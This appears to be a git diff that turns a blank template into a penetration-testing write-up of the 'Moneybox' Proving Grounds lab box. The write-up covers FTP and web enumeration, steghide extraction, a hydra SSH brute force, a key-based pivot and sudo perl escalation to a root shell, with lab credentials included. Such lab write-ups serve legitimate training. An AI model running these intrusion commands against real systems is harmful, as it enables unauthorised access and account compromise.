@@ -1,34 +1,31 @@
-<!-- ---
+---
 layout: default
-title: Katana
+title: Moneybox
 parent: Proving Grounds - Linux
-nav_order: 2
---- -->
+nav_order: 5
+---
 
-This is Katana - pineapple
-
-# [Box Name]
+# Moneybox
 
 ---
 
-## Host Info
-
-- _OS_:
-- _IP_:
-
 ## Discovered Ports for Enumeration
+
+- _21_ - FTP
+- _22_ - SSH
+- _80_ - HTTP
 
 ## Users and Credentials
 
-- _Users_:
-- _Credentials_:
+- _Users_: renu, lily
+- _Credentials_: renu:987654321
 
 # Scanning (Nmap)
 
 ---
 
 ```bash
-sudo nmap -Pn -p- -sC -sV -T4 -vv --open <ip>
+sudo nmap -Pn -p- -sC -sV -T4 -vv --open 192.168.162.230
 ```
 
 # Enumeration
@@ -37,57 +34,88 @@ sudo nmap -Pn -p- -sC -sV -T4 -vv --open <ip>
 
 ## 21 - FTP
 
+Anonymous logon allowed.
+
+Discovered _trytofind.jpg_ and downloaded locally.
+
+![ftp](../../../assets/images/ctfs/proving_grounds/moneybox/ftp.png)
+
+Located the following strings within _trytofind.jpg_
+
+```bash
+strings -n 20 trytofind.jpg
+456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+```
+
 ## 80 - HTTP
 
-## 445 - SMB
+### wfuzz
+
+Found _/blogs_ directory.
+Contains secret directory in HTML source code.
+
+![secret](../../../assets/images/ctfs/proving_grounds/moneybox/secret.png)
+
+Found a secret key in the _/S3cr3t-T3xt_ directory source code
+
+![secret2](../../../assets/images/ctfs/proving_grounds/moneybox/secret2.png)
+
+### Steghide
+
+Use _steghide_ to extract file from _trytofind.jpg_ by passing in the discovered secret passphrase _3xtr4ctd4t4_
+
+```bash
+steghide extract -sf trytofind.jpg --passphrase 3xtr4ctd4t4
+```
+
+![steghide](../../../assets/images/ctfs/proving_grounds/moneybox/steghide.png)
+
+We now have the user _renu_
 
 # Exploitation
 
 ---
 
+## Hydra
+
+Use _hydra_ to crack the password for _renu_ on SSH
+
+```bash
+hydra -l renu -P '/usr/share/wordlists/rockyou.txt' 192.168.162.230 ssh
+```
+
+![hydra](../../../assets/images/ctfs/proving_grounds/moneybox/hydra.png)
+
+SSH to target with credentials _renu:987654321_
+
 # Post-Exploitation
 
 ---
 
-- [ ] Upgrade to TTY Shell
+## Enumerate Users
+
+Locate the user _lily_ and _.ssh_ directory with an authorized key that can be used to pivot to _lily_
 
 ```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-ctrl+z
-stty size
-stty raw -echo
-fg
-stty rows <first_value>
-stty cols <second_value>
-export TERM=xterm-256color
+cd /home/lily/.ssh
+ssh lily@127.0.0.1
 ```
 
-- [ ] sudo -l
-- [ ] enumerate users
-- [ ] SUID/GUID
+![lily](../../../assets/images/ctfs/proving_grounds/moneybox/lily.png)
+
+## Sudo permissions
+
+We have sudo privileges for _/usr/bin/perl_
+
+![sudo](../../../assets/images/ctfs/proving_grounds/moneybox/sudo.png)
+
+![gtfobins](../../../assets/images/ctfs/proving_grounds/moneybox/gtfobins.png)
+
+Run _perl_ to execute /bin/bash and elevate to a root shell.
 
 ```bash
-find / -perm -u=s -type f 2>/dev/null
-find / -perm -g=s -type f 2>/dev/null
+sudo perl -e 'exec "/bin/bash";'
 ```
 
-- [ ] enumerate process running with root privileges
-
-```bash
-ps -aux | grep -i 'root'
-```
-
-- [ ] enumerate network services
-
-```bash
-netstat -antup (ss -tunlp)
-```
-
-- [ ] check for extended capabilities
-
-```bash
-getcap -r / 2>/dev/null
-```
-
-- [ ] test discovered credentials against all users
-- [ ] attempt hydra ssh password crack for discovered users
+![root](../../../assets/images/ctfs/proving_grounds/moneybox/root.png)
